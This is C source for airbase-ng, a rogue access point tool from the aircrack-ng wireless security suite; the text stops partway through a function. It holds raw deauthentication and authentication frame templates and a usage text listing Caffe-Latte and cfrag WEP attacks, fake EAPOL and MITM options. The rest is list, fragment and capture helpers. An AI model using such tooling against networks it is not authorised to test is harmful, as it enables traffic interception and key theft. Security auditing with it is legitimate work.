/*
 *  802.11 monitor AP
 *  based on airtun-ng
 *
 *  Copyright (C) 2008-2017 Thomas d'Otreppe <tdotreppe@aircrack-ng.org>
 *  Copyright (C) 2008, 2009 Martin Beck <hirte@aircrack-ng.org>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 *
 *  In addition, as a special exception, the copyright holders give
 *  permission to link the code of portions of this program with the
 *  OpenSSL library under certain conditions as described in each
 *  individual source file, and distribute linked combinations
 *  including the two.
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

#ifdef linux
    #include <linux/rtc.h>
#endif

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/time.h>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>
#include <sys/file.h>
#include <fcntl.h>

#include <ctype.h>

#include "version.h"
#include "pcap.h"
#include "crypto.h"
#include "common.h"
#include "eapol.h"

#include "osdep/osdep.h"
#include "osdep/common.h"

// libgcrypt thread callback definition for libgcrypt < 1.6.0
#ifdef USE_GCRYPT
    #if GCRYPT_VERSION_NUMBER < 0x010600
        GCRY_THREAD_OPTION_PTHREAD_IMPL;
    #endif
#endif

static struct wif *_wi_in, *_wi_out;

#define CRYPT_NONE 0
#define CRYPT_WEP  1

#define EXT_IN      0x01
#define EXT_OUT     0x02

#define NB_PRB 10       /* size of probed ESSID ring buffer */
#define MAX_CF_XMIT 100

#define TI_MTU 1500
#define WIF_MTU 1800

#define MAX_FRAME_EXTENSION 100

//if not all fragments are available 60 seconds after the last fragment was received, they will be removed
#define FRAG_TIMEOUT (1000000*60)

#define RTC_RESOLUTION  512

#define ALLOW_MACS      0
#define BLOCK_MACS      1

#define DEAUTH_REQ      \
    "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
    "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

#define AUTH_REQ        \
    "\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00"

#define ASSOC_REQ       \
    "\x00\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00"

#define NULL_DATA       \
    "\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B"

#define RTS             \
    "\xB4\x00\x4E\x04\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"

#define RATES           \
    "\x01\x04\x02\x04\x0B\x16"

#define EXTENDED_RATES           \
    "\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C"

#define PROBE_REQ       \
    "\x40\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00"

#define PROBE_RSP       \
    "\x50\x00\x3a\x01\xFF\xFF\xFF\xFF\xFF\xFF\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00"

#define WPA1_TAG        \
    "\xdd\x16\x00\x50\xf2\x01\x01\x00\x00\x50\xf2\x02\x01\x00\x00\x50"  \
    "\xf2\x01\x01\x00\x00\x50\xf2\x02"

#define WPA2_TAG        \
    "\x30\x14\x01\x00\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x01\x01\x00"  \
    "\x00\x0f\xac\x02\x01\x00"

#define ALL_WPA2_TAGS        \
    "\x30\x28\x01\x00\x00\x0f\xac\x01\x05\x00\x00\x0f\xac\x01\x00\x0f"  \
    "\xac\x02\x00\x0f\xac\x03\x00\x0f\xac\x04\x00\x0f\xac\x05\x02\x00"  \
    "\x00\x0f\xac\x01\x00\x0f\xac\x02\x03\x00"

#define ALL_WPA1_TAGS        \
    "\xdd\x2A\x00\x50\xf2\x01\x01\x00\x00\x50\xf2\x02\x05\x00\x00\x50"  \
    "\xf2\x01\x00\x50\xf2\x02\x00\x50\xf2\x03\x00\x50\xf2\x04\x00\x50"  \
    "\xf2\x05\x02\x00\x00\x50\xf2\x01\x00\x50\xf2\x02"

extern char * getVersion(char * progname, int maj, int min, int submin, int svnrev, int beta, int rc);
extern unsigned char * getmac(char * macAddress, int strict, unsigned char * mac);
extern int add_crc32(unsigned char* data, int length);

extern const unsigned long int crc_tbl[256];

extern int hexStringToArray(char* in, int in_length, unsigned char* out, int out_length);

char usage[] =
"\n"
"  %s - (C) 2008-2015 Thomas d'Otreppe\n"
"  Original work: Martin Beck\n"
"  http://www.aircrack-ng.org\n"
"\n"
"  usage: airbase-ng <options> <replay interface>\n"
"\n"
"  Options:\n"
"\n"
"      -a bssid         : set Access Point MAC address\n"
"      -i iface         : capture packets from this interface\n"
// "      -y file          : read PRGA from this file\n"
"      -w WEP key       : use this WEP key to en-/decrypt packets\n"
// "      -t tods          : send frames to AP (1) or to client (0)\n"
// "      -r file          : read frames out of pcap file\n"
"      -h MAC           : source mac for MITM mode\n"
"      -f disallow      : disallow specified client MACs (default: allow)\n"
"      -W 0|1           : [don't] set WEP flag in beacons 0|1 (default: auto)\n"
"      -q               : quiet (do not print statistics)\n"
"      -v               : verbose (print more messages)\n"
//"      -M               : M-I-T-M between [specified] clients and bssids\n"
"      -A               : Ad-Hoc Mode (allows other clients to peer)\n"
"      -Y in|out|both   : external packet processing\n"
"      -c channel       : sets the channel the AP is running on\n"
"      -X               : hidden ESSID\n"
"      -s               : force shared key authentication (default: auto)\n"
"      -S               : set shared key challenge length (default: 128)\n"
"      -L               : Caffe-Latte WEP attack (use if driver can't send frags)\n"
"      -N               : cfrag WEP attack (recommended)\n"
"      -x nbpps         : number of packets per second (default: 100)\n"
"      -y               : disables responses to broadcast probes\n"
"      -0               : set all WPA,WEP,open tags. can't be used with -z & -Z\n"
"      -z type          : sets WPA1 tags. 1=WEP40 2=TKIP 3=WRAP 4=CCMP 5=WEP104\n"
"      -Z type          : same as -z, but for WPA2\n"
"      -V type          : fake EAPOL 1=MD5 2=SHA1 3=auto\n"
"      -F prefix        : write all sent and received frames into pcap file\n"
"      -P               : respond to all probes, even when specifying ESSIDs\n"
"      -I interval      : sets the beacon interval value in ms\n"
"      -C seconds       : enables beaconing of probed ESSID values (requires -P)\n"
"      -n hex           : User specified ANonce when doing the 4-way handshake\n"
"\n"
"  Filter options:\n"
"      --bssid MAC      : BSSID to filter/use\n"
"      --bssids file    : read a list of BSSIDs out of that file\n"
"      --client MAC     : MAC of client to filter\n"
"      --clients file   : read a list of MACs out of that file\n"
"      --essid ESSID    : specify a single ESSID (default: default)\n"
"      --essids file    : read a list of ESSIDs out of that file\n"
"\n"
"      --help           : Displays this usage screen\n"
"\n";

struct options
{
    struct ST_info *st_1st, *st_end;

    unsigned char r_bssid[6];
    unsigned char r_dmac[6];
    unsigned char r_smac[6];

    unsigned char f_bssid[6];
    unsigned char f_netmask[6];

    char *s_face;
    char *s_file;
    unsigned char *prga;

    char *dump_prefix;
    char *keyout;
    char *f_cap_name;
    char *prefix;

    int f_index;            /* outfiles index       */
    FILE *f_cap;            /* output cap file      */
    FILE *f_xor;            /* output prga file     */
    unsigned char sharedkey[3][4096]; /* array for 3 packets with a size of \
                               up to 4096Byte */
    time_t sk_start;
    int sk_len;
    int sk_len2;

    int r_nbpps;
    int prgalen;
    int tods;

    unsigned char wepkey[64];
    int weplen, crypt;

    int f_essid;
    int promiscuous;
    int beacon_cache;
    int channel;
    int setWEP;
    int quiet;
    int mitm;
    int external;
    int hidden;
    int interval;
    int forceska;
    int skalen;
    int filter;
    int caffelatte;
    int ringbuffer;
    int adhoc;
    int nb_arp;
    int verbose;
    int wpa1type;
    int wpa2type;
    int nobroadprobe;
    int sendeapol;
    int allwpa;
    int cf_count;
    int cf_attack;
    int record_data;

    int ti_mtu;         //MTU of tun/tap interface
    int wif_mtu;        //MTU of wireless interface

    // Fixed nonce
    int use_fixed_nonce;
    unsigned char fixed_nonce[32];
}
opt;

struct devices
{
    int fd_in,  arptype_in;
    int fd_out, arptype_out;
    int fd_rtc;
    struct tif *dv_ti;
    struct tif *dv_ti2;

    int is_wlanng;
    int is_hostap;
    int is_madwifi;
    int is_madwifing;
    int is_bcm43xx;

    FILE *f_cap_in;

    struct pcap_file_header pfh_in;
}
dev;

struct ARP_req
{
    unsigned char *buf;
    int len;
};

struct AP_conf
{
    unsigned char bssid[6];
    char *essid;
    int essid_len;
    unsigned short interval;
    unsigned char capa[2];
};

typedef struct ESSID_list* pESSID_t;
struct ESSID_list
{
    char            *essid;
    unsigned char   len;
    pESSID_t        next;
	time_t          expire;
};

typedef struct MAC_list* pMAC_t;
struct MAC_list
{
    unsigned char   mac[6];
    pMAC_t          next;
};

typedef struct Fragment_list* pFrag_t;
struct Fragment_list
{
    unsigned char   source[6];
    unsigned short  sequence;
    unsigned char*  fragment[16];
    short           fragmentlen[16];
    char            fragnum;
    unsigned char*  header;
    short           headerlen;
    struct timeval  access;
    char            wep;
    pFrag_t         next;
};

/* linked list of detected clients */

struct ST_info
{
    struct ST_info *prev;    /* the prev client in list   */
    struct ST_info *next;    /* the next client in list   */
    struct AP_info *base;    /* AP this client belongs to */
    time_t tinit, tlast;     /* first and last time seen  */
    unsigned long nb_pkt;    /* total number of packets   */
    unsigned char stmac[6];  /* the client's MAC address  */
    char essid[256];         /* last associated essid     */
    int essid_length;        /* essid length of last asso */
    int probe_index;         /* probed ESSIDs ring index  */
    char probes[NB_PRB][256];/* probed ESSIDs ring buffer */
    int ssid_length[NB_PRB]; /* ssid lengths ring buffer  */
    int power;               /* last signal power         */
    int rate_to;             /* last bitrate to station   */
    int rate_from;           /* last bitrate from station */
    struct timeval ftimer;   /* time of restart           */
    int missed;              /* number of missed packets  */
    unsigned int lastseq;    /* last seen sequnce number  */
    struct WPA_hdsk wpa;     /* WPA handshake data        */
    int wpatype;             /* 1=wpa1 2=wpa2             */
    int wpahash;             /* 1=md5(tkip) 2=sha1(ccmp)  */
    int wep;                 /* capability encryption bit */
};

typedef struct CF_packet *pCF_t;
struct CF_packet
{
    unsigned char           frags[3][128];  /* first fragments to fill a gap */
    unsigned char           final[4096];    /* final frame derived from orig */
    int             fraglen[3];     /* fragmentation frame lengths   */
    int             finallen;       /* length of frame in final[]    */
    int             xmitcount;      /* how often was this frame sent */
    unsigned char   fragnum;        /* number of fragments to send   */
    pCF_t           next;           /* next set of fragments to send */
};

pthread_mutex_t mx_cf;              /* lock write access to rCF */
pthread_mutex_t mx_cap;              /* lock write access to rCF */

unsigned long nb_pkt_sent;
unsigned char h80211[4096];
unsigned char tmpbuf[4096];
unsigned char srcbuf[4096];
char strbuf[512];

int ctrl_c, alarmed, invalid_channel_displayed;

char * iwpriv;

struct ARP_req * arp;

pthread_t beaconpid;
pthread_t caffelattepid;
pthread_t cfragpid;

pESSID_t    rESSID;
pthread_mutex_t	rESSIDmutex;
pMAC_t      rBSSID;
pMAC_t      rClient;
pFrag_t     rFragment;
pCF_t       rCF;

void sighandler( int signum )
{
    if( signum == SIGINT )
        ctrl_c++;

    if( signum == SIGALRM )
        alarmed++;
}

int addESSID(char* essid, int len, int expiration)
{
    pESSID_t tmp;
	pESSID_t cur;
	time_t now;
    if(essid == NULL)
        return -1;

    if(len <= 0 || len > 255)
        return -1;

    pthread_mutex_lock(&rESSIDmutex);
    cur = rESSID;

    if(rESSID == NULL) {
        pthread_mutex_unlock(&rESSIDmutex);
        return -1;
    }

    while(cur->next != NULL) {
        // if it already exists, just update the expiration time
        if(cur->len == len && ! memcmp(cur->essid, essid, len)) {
            if(cur->expire && expiration) {
                time(&now);
                cur->expire = now + expiration;
            }
            pthread_mutex_unlock(&rESSIDmutex);
            return 0;
        }
        cur = cur->next;
    }

    //alloc mem
    tmp = (pESSID_t) malloc(sizeof(struct ESSID_list));

    //set essid
    tmp->essid = (char*) malloc(len+1);
    memcpy(tmp->essid, essid, len);
    tmp->essid[len] = 0x00;
    tmp->len = len;

    // set expiration date
    if(expiration) {
        time(&now);
        tmp->expire = now + expiration;
    } else {
        tmp->expire = 0;
    }

    tmp->next = NULL;
	cur->next = tmp;

    pthread_mutex_unlock(&rESSIDmutex);
    return 0;
}

int capture_packet(unsigned char* packet, int length)
{
    struct pcap_pkthdr pkh;
    struct timeval tv;
    int n;
#if defined(__sun__)
	struct flock fl;
	fl.l_start = 0;
	fl.l_len = 0;
	fl.l_whence = SEEK_SET;
#endif

    if( opt.f_cap != NULL && length >= 10)
    {
        pkh.caplen = pkh.len = length;

        gettimeofday( &tv, NULL );

        pkh.tv_sec  = tv.tv_sec;
        pkh.tv_usec = tv.tv_usec;

        n = sizeof( pkh );

#if defined(__sun__)
	fl.l_type = F_WRLCK;
	fcntl(fileno(opt.f_cap), F_SETLKW, &fl);
#else
	flock(fileno(opt.f_cap), LOCK_EX);
#endif
        if( fwrite( &pkh, 1, n, opt.f_cap ) != (size_t) n )
        {
		perror( "fwrite(packet header) failed" );
#if defined(__sun__)
		fl.l_type = F_UNLCK;
		fcntl(fileno(opt.f_cap), F_GETLK, &fl);
#else
		flock(fileno(opt.f_cap), LOCK_UN);
#endif
		return( 1 );
	}

        fflush( stdout );

        n = pkh.caplen;

        if( fwrite( packet, 1, n, opt.f_cap ) != (size_t) n )
        {
		perror( "fwrite(packet data) failed" );
#if defined(__sun__)
		fl.l_type = F_UNLCK;
		fcntl(fileno(opt.f_cap), F_GETLK, &fl);
#else
		flock(fileno(opt.f_cap), LOCK_UN);
#endif
		return( 1 );
        }

        fflush( stdout );

        fflush( opt.f_cap );
#if defined(__sun__)
	fl.l_type = F_UNLCK;
	fcntl(fileno(opt.f_cap), F_GETLK, &fl);
#else
	flock(fileno(opt.f_cap), LOCK_UN);
#endif
    }
    return 0;
}
int dump_initialize( char *prefix )
{
    int i=0;
    FILE *f;
    char ofn[1024];
    struct pcap_file_header pfh;

    if ( prefix == NULL) {
        return( 0 );
    }

    /* check not to overflow the ofn buffer */

    if( strlen( prefix ) >= sizeof( ofn ) - 10 )
        prefix[sizeof( ofn ) - 10] = '\0';

    /* make sure not to overwrite any existing file */

    memset( ofn, 0, sizeof( ofn ) );

    opt.f_index = 1;

    do
    {
        snprintf( ofn,  sizeof( ofn ) - 1, "%s-%02d.%s",
                    prefix, opt.f_index, "cap" );

        if( ( f = fopen( ofn, "rb+" ) ) != NULL )
        {
            fclose( f );
            opt.f_index++;
            continue;
        }
        i++;
    }
    while( i < 1 );

    opt.prefix = (char*) malloc(strlen(prefix)+2);
    snprintf(opt.prefix, strlen(prefix)+1, "%s", prefix);

    /* create the output packet capture file */

    snprintf( ofn,  sizeof( ofn ) - 1, "%s-%02d.cap",
                prefix, opt.f_index );

    if( ( opt.f_cap = fopen( ofn, "wb+" ) ) == NULL )
    {
        perror( "fopen failed" );
        fprintf( stderr, "Could not create \"%s\".\n", ofn );
        return( 1 );
    }

    opt.f_cap_name = (char*) malloc(128);
    snprintf(opt.f_cap_name, 127, "%s",ofn);

    pfh.magic           = TCPDUMP_MAGIC;
    pfh.version_major   = PCAP_VERSION_MAJOR;
    pfh.version_minor   = PCAP_VERSION_MINOR;
    pfh.thiszone        = 0;
    pfh.sigfigs         = 0;
    pfh.snaplen         = 65535;
    pfh.linktype        = LINKTYPE_IEEE802_11;

    if( fwrite( &pfh, 1, sizeof( pfh ), opt.f_cap ) !=
                (size_t) sizeof( pfh ) )
    {
        perror( "fwrite(pcap file header) failed" );
        return( 1 );
    }

    if(!opt.quiet)
    {
        PCT; printf("Created capture file \"%s\".\n", ofn);
    }

    return( 0 );
}

int addFrag(unsigned char* packet, unsigned char* smac, int len)
{
    pFrag_t cur = rFragment;
    int seq, frag, wep, z, i;
    unsigned char frame[4096];
    unsigned char K[128];

    if(packet == NULL)
        return -1;

    if(smac == NULL)
        return -1;

    if(len <= 32 || len > 2000)
        return -1;

    if(rFragment == NULL)
        return -1;

    memset(frame, 0, 4096);
    memcpy(frame, packet, len);

    z = ( ( frame[1] & 3 ) != 3 ) ? 24 : 30;
    frag = frame[22] & 0x0F;
    seq = (frame[22] >> 4) | (frame[23] << 4);
    wep = (frame[1] & 0x40) >> 6;

    if(frag < 0 || frag > 15)
        return -1;

    if(wep && opt.crypt != CRYPT_WEP)
        return -1;

    if(wep)
    {
        //decrypt it
        memcpy( K, frame + z, 3 );
        memcpy( K + 3, opt.wepkey, opt.weplen );

        if (decrypt_wep( frame + z + 4, len - z - 4,
                        K, 3 + opt.weplen ) == 0 && (len-z-4 > 8) )
        {
            printf("error decrypting... len: %d\n", len-z-4);
            return -1;
        }

        /* WEP data packet was successfully decrypted, *
        * remove the WEP IV & ICV and write the data  */

        len -= 8;

        memcpy( frame + z, frame + z + 4, len - z );

        frame[1] &= 0xBF;
    }

    while(cur->next != NULL)
    {
        cur = cur->next;
        if( (memcmp(smac, cur->source, 6) == 0) && (seq == cur->sequence) && (wep == cur->wep) )
        {
            //entry already exists, update
//             printf("got seq %d, added fragment %d \n", seq, frag);
            if(cur->fragment[frag] != NULL)
                return 0;

            if( (frame[1] & 0x04) == 0 )
            {
//                 printf("max fragnum is %d\n", frag);
                cur->fragnum = frag;    //no higher frag number possible
            }
            cur->fragment[frag] = (unsigned char*) malloc(len-z);
            memcpy(cur->fragment[frag], frame+z, len-z);
            cur->fragmentlen[frag] = len-z;
            gettimeofday(&cur->access, NULL);

            return 0;
        }
    }

//     printf("new seq %d, added fragment %d \n", seq, frag);
    //new entry, first fragment received
    //alloc mem
    cur->next = (pFrag_t) malloc(sizeof(struct Fragment_list));
    cur = cur->next;

    for(i=0; i<16; i++)
    {
        cur->fragment[i] = NULL;
        cur->fragmentlen[i] = 0;
    }

    if( (frame[1] & 0x04) == 0 )
    {
//         printf("max fragnum is %d\n", frag);
        cur->fragnum = frag;    //no higher frag number possible
    }
    else
    {
        cur->fragnum = 0;
    }

    //remove retry & more fragments flag
    frame[1] &= 0xF3;
    //set frag number to 0
    frame[22] &= 0xF0;
    memcpy(cur->source, smac, 6);
    cur->sequence = seq;
    cur->header = (unsigned char*) malloc(z);
    memcpy(cur->header, frame, z);
    cur->headerlen = z;
    cur->fragment[frag] = (unsigned char*) malloc(len-z);
    memcpy(cur->fragment[frag], frame+z, len-z);
    cur->fragmentlen[frag] = len-z;
    cur->wep = wep;
    gettimeofday(&cur->access, NULL);

    cur->next = NULL;

    return 0;
}

int timeoutFrag()
{
    pFrag_t old, cur = rFragment;
    struct timeval tv;
    int64_t timediff;
    int i;

    if(rFragment == NULL)
        return -1;

    gettimeofday(&tv, NULL);

    while(cur->next != NULL)
    {
        old = cur->next;
        timediff = (tv.tv_sec - old->access.tv_sec)*1000000UL + (tv.tv_usec - old->access.tv_usec);
        if(timediff > FRAG_TIMEOUT)
        {
            //remove captured fragments
            if(old->header != NULL)
                free(old->header);
            for(i=0; i<16; i++)
                if(old->fragment[i] != NULL)
                    free(old->fragment[i]);

            cur->next = old->next;
            free(old);
        }
        cur = cur->next;
    }
    return 0;
}

int delFrag(unsigned char* smac, int sequence)
{
    pFrag_t old, cur = rFragment;
    int i;

    if(rFragment == NULL)
        return -1;

    if(smac == NULL)
        return -1;

    if(sequence < 0)
        return -1;

    while(cur->next != NULL)
    {
        old = cur->next;
        if(memcmp(smac, old->source, 6) == 0 && old->sequence == sequence)
        {
            //remove captured fragments
            if(old->header != NULL)
                free(old->header);
            for(i=0; i<16; i++)
                if(old->fragment[i] != NULL)
                    free(old->fragment[i]);

            cur->next = old->next;
            free(old);
            return 0;
        }
        cur = cur->next;
    }
    return 0;
}

unsigned char* getCompleteFrag(unsigned char* smac, int sequence, int *packetlen)
{
    pFrag_t old, cur = rFragment;
    int i, len=0;
    unsigned char* packet=NULL;
    unsigned char K[128];

    if(rFragment == NULL)
        return NULL;

    if(smac == NULL)
        return NULL;

    while(cur->next != NULL)
    {
        old = cur->next;
        if(memcmp(smac, old->source, 6) == 0 && old->sequence == sequence)
        {
            //check if all frags available
            if(old->fragnum == 0)
                return NULL;
            for(i=0; i<=old->fragnum; i++)
            {
                if(old->fragment[i] == NULL)
                    return NULL;
                len += old->fragmentlen[i];
            }

            if(len > 2000)
                return NULL;

//             printf("got a complete frame -> build it\n");

            if(old->wep)
            {
                if( opt.crypt == CRYPT_WEP)
                {
					packet = (unsigned char*) malloc(len+old->headerlen+8);
                    K[0] = rand() & 0xFF;
                    K[1] = rand() & 0xFF;
                    K[2] = rand() & 0xFF;
                    K[3] = 0x00;

                    memcpy(packet, old->header, old->headerlen);
                    len=old->headerlen;
                    memcpy(packet+len, K, 4);
                    len+=4;
                    for(i=0; i<=old->fragnum; i++)
                    {
                        memcpy(packet+len, old->fragment[i], old->fragmentlen[i]);
                        len+=old->fragmentlen[i];
                    }

                    /* write crc32 value behind data */
                    if( add_crc32(packet+old->headerlen+4, len-old->headerlen-4) != 0 ) return NULL;

                    len += 4; //icv

                    memcpy( K + 3, opt.wepkey, opt.weplen );

                    encrypt_wep( packet+old->headerlen+4, len-old->headerlen-4, K, opt.weplen+3 );

                    packet[1] = packet[1] | 0x40;

                    //delete captured fragments
                    delFrag(smac, sequence);
                    *packetlen = len;
                    return packet;
                }
                else
                    return NULL;

            }
            else
            {
                packet = (unsigned char*) malloc(len+old->headerlen);
                memcpy(packet, old->header, old->headerlen);
                len=old->headerlen;
                for(i=0; i<=old->fragnum; i++)
                {
                    memcpy(packet+len, old->fragment[i], old->fragmentlen[i]);
                    len+=old->fragmentlen[i];
                }
                //delete captured fragments
                delFrag(smac, sequence);
                *packetlen = len;
                return packet;
            }
        }
        cur = cur->next;
    }
    return packet;
}

int addMAC(pMAC_t pMAC, unsigned char* mac)
{
    pMAC_t cur = pMAC;

    if(mac == NULL)
        return -1;

    if(pMAC == NULL)
        return -1;

    while(cur->next != NULL)
        cur = cur->next;

    //alloc mem
    cur->next = (pMAC_t) malloc(sizeof(struct MAC_list));
    cur = cur->next;

    //set mac
    memcpy(cur->mac, mac, 6);

    cur->next = NULL;

    return 0;
}

int delESSID(char* essid, int len)
{
    pESSID_t old, cur;

    if(essid == NULL)
        return -1;

    if(len <= 0 || len > 255)
        return -1;

    pthread_mutex_lock(&rESSIDmutex);
    cur = rESSID;

    if(rESSID == NULL) {
        pthread_mutex_unlock(&rESSIDmutex);
        return -1;
    }

    while(cur->next != NULL)
    {
        old = cur->next;
        if(old->len == len)
        {
            if(memcmp(old->essid, essid, len) == 0)
            {
                //got it
                cur->next = old->next;

                free(old->essid);
                old->essid = NULL;
                old->next = NULL;
                old->len = 0;
                free(old);
                pthread_mutex_unlock(&rESSIDmutex);
                return 0;
            }
        }
        cur = cur->next;
    }

    pthread_mutex_unlock(&rESSIDmutex);
    return -1;
}


void flushESSID(void)
{
    pESSID_t old;
	pESSID_t cur;
	time_t now;

    pthread_mutex_lock(&rESSIDmutex);
    cur = rESSID;

    if(rESSID == NULL) {
        pthread_mutex_unlock(&rESSIDmutex);
        return;
    }

    while(cur->next != NULL)
    {
        old = cur->next;
        if(old->expire)
        {
            time(&now);
            if(now > old->expire)
            {
                //got it
                cur->next = old->next;

                free(old->essid);
                old->essid = NULL;
                old->next = NULL;
                old->len = 0;
                free(old);
                pthread_mutex_unlock(&rESSIDmutex);
                return;
            }
        }
        cur = cur->next;
    }
    pthread_mutex_unlock(&rESSIDmutex);
}


int delMAC(pMAC_t pMAC, char* mac)
{
    pMAC_t old, cur = pMAC;

    if(mac == NULL)
        return -1;

    if(pMAC == NULL)
        return -1;

    while(cur->next != NULL)
    {
        old = cur->next;
        if(memcmp(old->mac, mac, 6) == 0)
        {
            //got it
            cur->next = old->next;

            old->next = NULL;
            free(old);
            return 0;
        }
        cur = cur->next;
    }

    return -1;
}

int gotESSID(char* essid, int len)
{
    pESSID_t old, cur;

    if(essid == NULL)
        return -1;

    if(len <= 0 || len > 255)
        return -1;

    pthread_mutex_lock(&rESSIDmutex);
    cur = rESSID;

    if(rESSID == NULL) {
        pthread_mutex_unlock(&rESSIDmutex);
        return -1;
    }

    while(cur->next != NULL)
    {
        old = cur->next;
        if(old->len == len)
        {
            if(memcmp(old->essid, essid, len) == 0)
            {
                pthread_mutex_unlock(&rESSIDmutex);
                return 1;
            }
        }
        cur = cur->next;
    }

    pthread_mutex_unlock(&rESSIDmutex);
    return 0;
}

int gotMAC(pMAC_t pMAC, unsigned char* mac)
{
    pMAC_t cur = pMAC;

    if(mac == NULL)
        return -1;

    if(pMAC == NULL)
        return -1;

    while(cur->next != NULL)
    {
        cur = cur->next;
        if(memcmp(cur->mac, mac, 6) == 0)
        {
            //got it
            return 1;
        }
    }

    return 0;
}

int getESSID(char *essid)
{
    int len;
    pthread_mutex_lock(&rESSIDmutex);

    if(rESSID == NULL || rESSID->next == NULL) {
        pthread_mutex_unlock(&rESSIDmutex);
        return 0;
    }

    memcpy(essid, rESSID->next->essid, rESSID->next->len + 1);
    len = rESSID->next->len;
    pthread_mutex_unlock(&rESSIDmutex);

    return len;
}

int getNextESSID(char *essid)
{
    int len;
    pESSID_t cur;

    pthread_mutex_lock(&rESSIDmutex);

    if(rESSID == NULL || rESSID->next == NULL) {
        pthread_mutex_unlock(&rESSIDmutex);
        return 0;
    }

    len = strlen(essid);
    for (cur = rESSID->next; cur != NULL; cur = cur->next)
    {
    	if (*essid == 0) {
    		break;
    	}
    	// Check if current SSID.
    	if (cur->len == len && cur->essid != NULL && strcmp(essid, cur->essid) == 0) {
        	// SSID found, get next one
        	cur = cur->next;
        	if (cur == NULL) {
        		cur = rESSID->next;
        	}
        	break;
    	}
    }
    len = 0;

    if (cur != NULL) {
        memcpy(essid, cur->essid, cur->len + 1);
        len = cur->len;

    }
    pthread_mutex_unlock(&rESSIDmutex);

    return len;
}

int getESSIDcount()
{
    pESSID_t cur;
    int count=0;

    pthread_mutex_lock(&rESSIDmutex);
    cur = rESSID;

    if(rESSID == NULL) {
        pthread_mutex_unlock(&rESSIDmutex);
        return -1;
    }

    while(cur->next != NULL)
    {
        cur = cur->next;
        count++;
    }

    pthread_mutex_unlock(&rESSIDmutex);
    return count;
}

int getMACcount(pMAC_t pMAC)
{
    pMAC_t cur = pMAC;
    int count=0;

    if(pMAC == NULL)
        return -1;

    while(cur->next != NULL)
    {
        cur = cur->next;
        count++;
    }

    return count;
}

unsigned char* getMAC(pMAC_t pMAC)
{
    pMAC_t cur = pMAC;

    if(pMAC == NULL)
        return NULL;

    if(cur->next != NULL)
        return cur->next->mac;

    return NULL;
}

int addESSIDfile(char* filename)
{
    FILE *list;
    char essid[256];
	int x;

    list = fopen(filename, "r");
    if(list == NULL)
    {
        perror("Unable to open ESSID list");
        return -1;
    }

    while( fgets(essid, 256, list) != NULL )
    {
        // trim trailing whitespace
        x = strlen(essid) - 1;
        while (x >= 0 && isspace((int)essid[x]))
            essid[x--] = 0;

        if(strlen(essid))
            addESSID(essid, strlen(essid), 0);
    }

    fclose(list);

    return 0;
}

int addMACfile(pMAC_t pMAC, char* filename)
{
    FILE *list;
    unsigned char mac[6];
    char buffer[256];

    list = fopen(filename, "r");
    if(list == NULL)
    {
        perror("Unable to open MAC list");
        return -1;
    }

    while( fgets(buffer, 256, list) != NULL )
    {
        if(getmac(buffer, 1, mac) == 0)
            addMAC(pMAC, mac);
    }

    fclose(list);

    return 0;
}

int is_filtered_netmask(unsigned char *bssid)
{
    unsigned char mac1[6];
    unsigned char mac2[6];
    int i;

    for(i=0; i<6; i++)
    {
        mac1[i] = bssid[i]     & opt.f_netmask[i];
        mac2[i] = opt.f_bssid[i] & opt.f_netmask[i];
    }

    if( memcmp(mac1, mac2, 6) != 0 )
    {
        return( 1 );
    }

    return 0;
}

int send_packet(void *buf, size_t count)
{
        struct wif *wi = _wi_out; /* XXX globals suck */
        if (wi_write(wi, buf, count, NULL) == -1) {
                perror("wi_write()");
                return -1;
        }

        pthread_mutex_lock( &mx_cap );
        if(opt.record_data)
            capture_packet(buf, count);
        pthread_mutex_unlock( &mx_cap );

        nb_pkt_sent++;
        return 0;
}

int read_packet(void *buf, size_t count)
{
        struct wif *wi = _wi_in; /* XXX */
        int rc;

        rc = wi_read(wi, buf, count, NULL);
        if (rc == -1) {
                perror("wi_read()");
                return -1;
        }

        return rc;
}

int msleep( int msec )
{
    struct timeval tv, tv2;
    float f, ticks;
    int n;

    if(msec == 0) msec = 1;

    ticks = 0;

    while( 1 )
    {
        /* wait for the next timer interrupt, or sleep */

        if( dev.fd_rtc >= 0 )
        {
